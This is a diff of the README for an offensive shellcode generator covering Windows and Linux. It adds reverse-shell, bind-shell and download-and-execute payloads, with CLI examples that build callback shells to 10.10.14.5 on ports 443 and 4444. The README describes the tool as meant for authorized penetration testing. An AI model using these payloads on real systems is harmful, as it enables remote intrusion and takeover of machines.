@@ -1,12 +1,8 @@
 # Multi-Architecture Shellcode Generator
 
-A powerful Python-based shellcode generator supporting Windows (x86/x64) and Linux (ARM/ARM64) architectures with automatic bad character avoidance.
-
-**⚠️ This tool has been refactored into a modular structure. See [MODULAR_STRUCTURE.md](MODULAR_STRUCTURE.md) for details.**
+A powerful Python-based shellcode generator supporting Windows (x86/x64) and Linux (x86/x64/ARM/ARM64) architectures with automatic bad character avoidance.
 
 ## Quick Start
-
-**Zero-Configuration Usage** - Use wrapper scripts (no venv activation needed):
 
 ```bash
 # List available payloads
@@ -26,22 +22,7 @@ A powerful Python-based shellcode generator supporting Windows (x86/x64) and Lin
 ./hash_generator.py --format python LoadLibraryA GetProcAddress
 ```
 
-**Alternative** - Direct script usage (requires venv activation):
-
-```bash
-# Activate venv first
-source venv/bin/activate
-
-# Then use the tools
-./shellgen_cli.py --list-payloads
-./hash_generator.py LoadLibraryA
-```
-
-See [USE_WITHOUT_ACTIVATE.md](USE_WITHOUT_ACTIVATE.md) for more usage options.
-
 ## Project Structure
-
-The tool has been refactored into a modular package structure:
 
 ```
 shellgen/
@@ -53,18 +34,14 @@ shellgen/
 │   ├── payloads.py             # High-level payload builders
 │   ├── cli.py                  # Command-line interface
 │   └── generators/             # OS-specific generators
-│       ├── windows.py          # Windows (x86/x64/ARM/ARM64) - PEB walk, API resolution
+│       ├── windows.py          # Windows (x86/x64) - PEB walk, API resolution
 │       └── linux.py            # Linux (x86/x64/ARM/ARM64) - Syscalls
 ├── shellgen_cli.py             # Main CLI entry point
 ├── hash_generator.py           # ROR13 hash generator for API resolution
-├── shellgen.sh                 # Wrapper script (no venv activation needed!)
-├── hashgen.sh                  # Hash generator wrapper (no venv activation needed!)
 ├── common_apis.txt             # Common Windows API function names
 ├── README.md                   # This file
 └── CLAUDE.md                   # Technical documentation
 ```
-
-**Note:** The original `shellcode.py` is deprecated. Use `shellgen_cli.py` instead.
 
 ## Installation
 
@@ -241,19 +218,23 @@ shellgen --list-payloads
 ## Available Payloads
 
 ### Windows (x86/x64)
-- **messagebox** - Display MessageBox dialog
-- **winexec** - Execute command via WinExec
-- **createprocess** - Execute command via CreateProcessA (more flexible than WinExec)
-- **shellexecute** - Execute programs/URLs via ShellExecuteA (supports operations like "open", "runas")
-- **system** - Execute command via system() from msvcrt.dll (C runtime)
-- **download_exec** - Download file and execute (URLDownloadToFile + WinExec)
-- **reverse_shell** - Native socket reverse shell (runs in current process, most stealthy)
-- **reverse_shell_powershell** - PowerShell reverse shell (spawns child process, more reliable)
-- **bind_shell** - Native TCP bind shell (listens for incoming connections)
+- **messagebox** - Display MessageBox dialog (x86, x64)
+- **winexec** - Execute command via WinExec (x86, x64)
+- **createprocess** - Execute via CreateProcessA (flexible process creation) (x86, x64)
+- **shellexecute** - Execute via ShellExecuteA (programs/URLs with verbs) (x86, x64)
+- **system** - Execute via system() from msvcrt.dll (C runtime) (x86, x64)
+- **download_exec** - Download file (URLDownloadToFile) and execute (x86, x64)
+- **reverse_shell** - Native socket reverse shell (runs in current process) (x86)
+- **reverse_shell_x64** - Native socket reverse shell (x64)
+- **reverse_shell_powershell** - PowerShell reverse shell (spawns child process) (x86, x64)
+- **bind_shell** - Native socket bind shell (listens for connections) (x86)
+- **bind_shell_x64** - Native socket bind shell (x64)
+- **bind_shell_simple** - PowerShell bind shell (simple, spawns child process) (x86, x64)
 
-### Linux (ARM/ARM64)
-- **execve** - Execute command via syscall
-- **reverse_shell** - Native socket reverse shell
+### Linux (x86/x64/ARM/ARM64)
+- **execve** - Execute commands via execve syscall (x86, x64, arm, arm64)
+- **reverse_shell** - TCP reverse shell (socket + execve) (x86, x64, arm, arm64)
+- **bind_shell** - TCP bind shell (listens + execve) (x86, x64, arm, arm64)
 
 ## Usage Examples
 
@@ -340,11 +321,37 @@ shellgen --platform windows --payload reverse_shell \
 # - Uses NEG encoding (two's complement) for shell string to avoid null bytes
 ```
 
+#### Windows x64 Native Reverse Shell
+```bash
+shellgen --platform windows --payload reverse_shell_x64 \
+  --host 10.10.14.5 \
+  --port 443
+```
+
 #### PowerShell Reverse Shell (Reliable - Spawns Child Process)
 ```bash
 shellgen --platform windows --payload reverse_shell_powershell \
   --host 10.10.14.5 \
   --port 443 \
+  --arch x86
+```
+
+#### Native Bind Shell
+```bash
+# x86 bind shell
+shellgen --platform windows --payload bind_shell \
+  --port 4444 \
+  --shell "cmd.exe"
+
+# x64 bind shell
+shellgen --platform windows --payload bind_shell_x64 \
+  --port 4444
+```
+
+#### PowerShell Bind Shell (Simple)
+```bash
+shellgen --platform windows --payload bind_shell_simple \
+  --port 4444 \
   --arch x86
 ```
 
@@ -364,7 +371,7 @@ shellgen --platform windows --payload winexec \
 # - Summary of total bad characters found
 ```
 
-### Linux ARM/ARM64 Payloads
+### Linux Payloads
 
 #### ARM64 Reverse Shell
 ```bash
@@ -390,6 +397,22 @@ shellgen --platform linux --payload execve \
 shellgen --platform linux --payload execve \
   --cmd "/bin/sh" \
   --arch arm64
+```
+
+#### Linux x64 Reverse Shell
+```bash
+shellgen --platform linux --payload reverse_shell \
+  --host 10.10.14.5 \
+  --port 4444 \
+  --arch x64
+```
+
+#### Linux ARM Bind Shell
+```bash
+shellgen --platform linux --payload bind_shell \
+  --port 4444 \
+  --arch arm \
+  --shell "/bin/sh"
 ```
 
 ### Output Formats
@@ -455,6 +478,13 @@ For advanced use cases, you can create custom payloads by defining API calls in 
     - `null` or `0` for NULL pointers
     - Strings (e.g., `"C:\\test.txt"`, `"Hello World!"`)
     - Register references (e.g., `"REG:eax"`, `"REG:esp"`)
+  - `save_result` - Register to save the return value (EAX) into after the call (optional).
+    Emits `mov <reg>, eax` after the API call. Use this to preserve return values across
+    multiple calls. The saved register can then be referenced in later calls via `"REG:<reg>"`.
+    Common choices: `"esi"`, `"edi"` (callee-saved, won't be clobbered by most API calls).
+    **Caution:** String argument preparation uses `edi`, `esi`, `edx` as scratch registers (x86),
+    so a saved value may be clobbered if a later call has plain string arguments that trigger
+    string prep into the same register.
 - `exit` - Whether to call ExitProcess at the end (optional, defaults to `true`)
 
 #### Using Custom JSON Payloads
@@ -537,19 +567,37 @@ cat example_payload.json
 }
 ```
 
-#### Register References
+#### Register References & save_result
 
-Use `"REG:register_name"` to reference values stored in registers from previous API calls:
+Use `"REG:register_name"` in `args` to reference register values. Use `"save_result"` on a call object to preserve the return value (EAX) in a named register for later use.
 
-- `"REG:eax"` - Return value from previous API call
+**Available registers for `"REG:"`:**
+- `"REG:eax"` - Return value from the immediately previous API call
 - `"REG:ebx"` - EBX register value
-- `"REG:ecx"` - ECX register value (often used for string pointers)
+- `"REG:ecx"` - ECX register value
 - `"REG:edx"` - EDX register value
 - `"REG:esi"` - ESI register value
 - `"REG:edi"` - EDI register value
-- `"REG:esp"` - Stack pointer (useful for passing pointer to DWORD)
+- `"REG:esp"` - Stack pointer (useful for passing pointer to DWORD output parameter)
 
-**Example:** CreateFileA returns file handle in EAX, which is then used by WriteFile:
+**x64 registers:** `"REG:rax"`, `"REG:rcx"`, `"REG:rdx"`, `"REG:r8"` through `"REG:r15"`, etc.
+
+**`save_result` field:**
+
+Without `save_result`, the return value in EAX is only available to the *immediately next* call via `"REG:eax"`. If a later call has string arguments, string preparation will clobber EAX before the argument push phase. `save_result` lets you move EAX into a more durable register right after the call returns.
+
+```json
+{
+  "api": "VirtualAlloc",
+  "dll": "kernel32.dll",
+  "args": [null, 4096, "0x3000", "0x40"],
+  "save_result": "edi"
+}
+```
+
+This emits `mov edi, eax` after the VirtualAlloc call. Later calls can reference the buffer via `"REG:edi"`.
+
+**Example: Chaining return values across multiple calls:**
 
 ```json
 {
@@ -557,16 +605,26 @@ Use `"REG:register_name"` to reference values stored in registers from previous 
     {
       "api": "CreateFileA",
       "dll": "kernel32.dll",
-      "args": ["C:\\test.txt", "0x40000000", 0, null, 2, 0, null]
+      "args": ["C:\\test.txt", "0x40000000", 0, null, 2, 0, null],
+      "save_result": "esi"
     },
     {
       "api": "WriteFile",
       "dll": "kernel32.dll",
-      "args": ["REG:eax", "Data", 4, "REG:esp", 0]
+      "args": ["REG:esi", "Hello World!", 12, "REG:esp", 0]
+    },
+    {
+      "api": "CloseHandle",
+      "dll": "kernel32.dll",
+      "args": ["REG:esi"]
     }
   ]
 }
 ```
+
+Without `save_result`, the file handle from `CreateFileA` would be lost after `WriteFile` (whose return value overwrites EAX). With `"save_result": "esi"`, the handle is preserved in ESI for both `WriteFile` and `CloseHandle`.
+
+**Caution:** On x86, string argument preparation uses `edi`, `esi`, `edx` as scratch registers. If a later call has plain string arguments, it may clobber a register you saved into. Plan your register choices accordingly — if a subsequent call has string args that will use `edi`, save into a register that won't be touched (or reorder your calls).
 
 #### Common API Function Arguments
 
@@ -636,7 +694,9 @@ Options:
   --host HOST               Target IP address for reverse shell
   --port PORT               Target port for reverse shell
   --shell SHELL             Shell to execute (e.g., cmd.exe, powershell.exe, /bin/bash)
-                            Works with: reverse_shell (Windows/Linux), execve (Linux)
+                            Works with: reverse_shell, reverse_shell_x64,
+                            reverse_shell_powershell, bind_shell, bind_shell_x64
+                            (Windows), execve (Linux)
 
   # Output options:
   --output OUTPUT           Output filename (default: shellcode.asm)
@@ -653,10 +713,12 @@ Options:
 |--------------|----------|--------------------|----------------|
 | x86 (32-bit) | Windows  | Keystone           | ✅ Full Support |
 | x64 (64-bit) | Windows  | Keystone           | ✅ Full Support |
-| ARM32        | Linux    | **Keystone Only**  | ✅ Full Support |
-| ARM64        | Linux    | **Keystone Only**  | ✅ Full Support |
+| x86 (32-bit) | Linux    | Keystone           | ✅ Full Support |
+| x64 (64-bit) | Linux    | Keystone           | ✅ Full Support |
+| ARM32        | Linux    | Keystone           | ✅ Full Support |
+| ARM64        | Linux    | Keystone           | ✅ Full Support |
 
-**Important:** All architectures now require Keystone Engine.
+**Important:** All architectures require Keystone Engine.
 
 ## Features
 
@@ -787,33 +849,6 @@ shellcode = assemble_to_binary(asm_code, arch='arm64')
 print(f"Linux ARM64 shellgen size: {len(shellcode)} bytes")
 ```
 
-## Migration from Old Script
-
-The original `shellcode.py` monolithic script is deprecated. Here's the migration guide:
-
-### Old Command
-```bash
-python3 shellgen.py --payload winexec_cmd --cmd "calc.exe" --arch x86
-```
-
-### New Command
-```bash
-./shellgen_cli.py --platform windows --payload winexec --cmd "calc.exe" --arch x86
-```
-
-### Payload Name Changes
-
-| Old Payload     | New Payload     | Platform             |
-|-----------------|-----------------|----------------------|
-| `winexec_cmd`   | `winexec`       | `windows`            |
-| `winexec_smb`   | *(removed)*     | -                    |
-| `reverse_shell` | `reverse_shell` | `windows` or `linux` |
-| `execve`        | `execve`        | `linux`              |
-| *(new)*         | `messagebox`    | `windows`            |
-| *(new)*         | `download_exec` | `windows`            |
-
-See [MODULAR_STRUCTURE.md](MODULAR_STRUCTURE.md) for complete migration details.
-
 ## Security Notice
 
 This tool is designed for **authorized security testing only**. Use cases include:
@@ -827,9 +862,11 @@ This tool is designed for **authorized security testing only**. Use cases includ
 
 ## Architecture-Specific Notes
 
-### ARM/ARM64 Linux
+### Linux (x86/x64/ARM/ARM64)
 - Uses direct syscalls (no libc dependencies)
 - Syscall numbers:
+  - x86: socket=359, connect=362, dup2=63, execve=11
+  - x64: socket=41, connect=42, dup2=33, execve=59
   - ARM32: socket=281, connect=283, dup2=63, execve=11
   - ARM64: socket=198, connect=203, dup3=24, execve=221
 - Requires Keystone Engine for assembly
@@ -994,7 +1031,6 @@ See the installation troubleshooting section in the original README or install f
 ## Documentation
 
 - **README.md** - Installation and usage (this file)
-- **MODULAR_STRUCTURE.md** - Detailed modular architecture documentation
 - **CLAUDE.md** - Technical documentation and implementation details
 
 ## Additional Resources
